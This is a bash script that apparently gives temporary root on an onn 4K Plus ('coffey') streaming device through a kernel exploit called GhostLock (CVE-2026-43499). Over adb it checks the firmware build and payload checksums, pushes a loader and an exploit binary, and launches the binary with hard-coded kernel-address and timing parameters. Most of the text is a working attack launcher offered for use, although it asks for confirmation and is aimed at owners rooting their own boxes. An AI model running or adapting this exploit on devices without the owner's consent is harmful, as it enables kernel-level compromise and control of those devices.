#!/usr/bin/env bash
# One-command temporary root for the onn 4K Plus ("coffey").
#
# Memory-only GhostLock (CVE-2026-43499): no flash, no wipe, no permanent
# change. A reboot clears root. Requires USB debugging and a host.
#
# Usage:
#   tools/coffey-root.sh [--serial S] [--yes] [--check] [--force] [--build]
# --force refuses a live loop; reboot the device before requesting a fresh run.
#
# After it succeeds:
#   tools/coffey-sudo.sh 'id; ls /data'
set -euo pipefail

ASSETS=${ONNDEMAND_ASSET_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}
RT=/data/local/tmp/rt
BIN="$ASSETS/payload/coffey-root-arm64"
LOADER="$ASSETS/payload/rootloop.sh"
SERIAL=""
YES=0
CHECK=0
FORCE=0
DO_BUILD=0

usage() {
  sed -n '2,14p' "$0" | sed 's/^# \{0,1\}//'
}

while [ $# -gt 0 ]; do
  case "$1" in
    --serial) SERIAL=${2:?}; shift 2 ;;
    --yes|-y) YES=1; shift ;;
    --check) CHECK=1; shift ;;
    --force) FORCE=1; shift ;;
    --build) DO_BUILD=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) echo "unknown arg: $1" >&2; usage >&2; exit 2 ;;
  esac
done

ADB=(adb)
[ -n "$SERIAL" ] && ADB+=(-s "$SERIAL")
say() { printf '[*] %s\n' "$*"; }
die() { printf '[!] %s\n' "$*" >&2; exit 1; }

device() {
  "${ADB[@]}" get-state >/dev/null 2>&1 || die "no adb device (plug USB / enable debugging)"
}
sh_dev() { "${ADB[@]}" shell "$@"; }
loop_alive() {
  sh_dev 'ps -A -o ARGS 2>/dev/null | grep -q "[s]h /data/local/tmp/rt/ksu_loader.sh"' 2>/dev/null
}

device
DEV=$("${ADB[@]}" shell getprop ro.product.device 2>/dev/null | tr -d '\r')
FP=$("${ADB[@]}" shell getprop ro.build.fingerprint 2>/dev/null | tr -d '\r')

if [ "$CHECK" = 1 ]; then
  if loop_alive; then
    echo "root loop: ALIVE"
    sh_dev 'cat /data/local/tmp/rt/loader.status 2>/dev/null'
    exit 0
  fi
  echo "root loop: not running"
  exit 1
fi

if [ "$DEV" != "coffey" ]; then
  die "device is '$DEV', not coffey"
fi
if loop_alive; then
  [ "$FORCE" != 1 ] || die "root loop is already alive; reboot the device before a fresh run; refusing a duplicate loop"
  say "root loop already alive; nothing to do"
  sh_dev 'cat /data/local/tmp/rt/loader.status 2>/dev/null'
  exit 0
fi

[ "$DO_BUILD" != 1 ] || die "Rebuild from the checkout with tools/build_release_assets.py --ndk PATH; then rerun without --build"
[ "$FP" = 'onn/coffey/coffey:14/URO4.260304.011.B1/15051976:user/release-keys' ] || die "firmware differs from the supported coffey build 15051976"
[ -f "$BIN" ] || die "bundled exploit binary missing: $BIN"
[ -f "$LOADER" ] || die "loader script missing: $LOADER"
"${ONNDEMAND_PYTHON:-python3}" - "$ASSETS" <<'VERIFY'
import hashlib, json, pathlib, sys
assets = pathlib.Path(sys.argv[1])
pins = json.loads((assets / 'manifest.json').read_text())['files']
for name in ('payload/coffey-root-arm64', 'payload/rootloop.sh'):
    path, pin = assets / name, pins[name]
    if path.stat().st_size != pin['bytes'] or hashlib.sha256(path.read_bytes()).hexdigest() != pin['sha256']:
        sys.exit('Bundled payload checksum mismatch: ' + name)
VERIFY

if [ "$YES" != 1 ]; then
  printf 'This runs a kernel exploit on %s (%s).\n' "${SERIAL:-$DEV}" "$FP"
  printf 'It is memory-only; a failed run can panic and reboot the box.\n'
  printf 'Continue? [y/N] '
  read -r ans
  case "$ans" in y|Y|yes|YES) ;; *) exit 1 ;; esac
fi

say "installing loader"
sh_dev "mkdir -p $RT && chmod 0777 $RT"
"${ADB[@]}" push "$LOADER" "$RT/ksu_loader.sh" >/dev/null
sh_dev "chmod 0755 $RT/ksu_loader.sh; rm -f $RT/loader.status $RT/route.log $RT/route.rc"

say "pushing exploit"
"${ADB[@]}" push "$BIN" /data/local/tmp/coffey >/dev/null
sh_dev "chmod 0700 /data/local/tmp/coffey"

say "running GhostLock (this can take 1-3 min; the box may reboot on a miss)"
set +e
sh_dev "KASLR_BASE_OVERRIDE=0xffffffc008000000 SKIP_HIJACK=1 \
  SLIDE_SHIFT=6 P0_PHYS_LOAD=0x01800000 PSELECT_ENTER_DELAY=1000000 \
  SYSCTL_WALK_ATTEMPTS=40 KS_MAX_TRIES=6 DM_SETTLE_MS=3000 \
  KSU_LOADER=$RT/ksu_loader.sh KSU_RUNDIR=$RT \
  /data/local/tmp/coffey </dev/null >$RT/route.log 2>&1; echo \$? > $RT/route.rc"
RC=$?
set -e

"${ADB[@]}" wait-for-device >/dev/null 2>&1 || true
for _ in $(seq 1 90); do
  boot=$("${ADB[@]}" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
  [ "$boot" = 1 ] && break
  sleep 2
done

for _ in $(seq 1 30); do
  if loop_alive; then
    say "root loop is alive"
    sh_dev 'cat /data/local/tmp/rt/loader.status 2>/dev/null'
    cat <<EOF

Use it like a root shell:
  tools/coffey-sudo.sh 'id; ls /data'

A reboot clears root; re-run this script to get it back.
EOF
    exit 0
  fi
  sleep 2
done

say "no root loop after the run (adb rc=$RC)"
sh_dev "tail -20 $RT/route.log 2>/dev/null" || true
die "root not established; re-run, or check the log above"
